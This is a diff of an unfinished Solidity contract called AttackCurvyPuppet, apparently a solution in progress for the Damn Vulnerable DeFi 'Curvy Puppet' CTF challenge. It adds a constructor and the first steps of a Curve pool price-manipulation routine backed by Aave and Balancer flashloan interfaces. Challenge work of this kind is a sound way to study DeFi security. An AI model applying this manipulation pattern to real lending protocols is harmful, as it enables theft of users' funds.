@@ -213,14 +213,43 @@ contract AttackCurvyPuppet {
     address public player;
     uint256 public treasuryLpBalance;
     IERC20 stETH;
+    WETH weth;
     address treasury;
     DamnValuableToken dvt;
         IPermit2 constant permit2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
         IAaveFlashloan AaveV2 = IAaveFlashloan(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
         IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
 
+    constructor(
+        IStableSwap _curvePool,
+        CurvyPuppetLending _lending,
+        IERC20 _curveLpToken,
+        address _player,
+        uint256 _treasuryLpBalance,
+        IERC20 _stETH,
+        WETH _weth,
+        address _treasury,
+        DamnValuableToken _dvt
+    ) {
+        curvePool = _curvePool;
+        lending = _lending;
+        curveLpToken = _curveLpToken;
+        player = _player;
+        treasuryLpBalance = _treasuryLpBalance;
+        stETH = _stETH;
+        weth = _weth;
+        treasury = _treasury;
+        dvt = _dvt;
+    }
     function manipulateCurvePool() public {
+        // add liquidity to the pool
+        weth.withdraw(58685 ether);
+        
+        console.log("LP token price before removing liquidity", curvePool.get_virtual_price());
+        // Swap ETH for stETH
+        stETH.approve(address(curvePool), type(uint256).max);
 
+        uint256[2] memory amount;
     }
 
     function removeLiquidity() public {
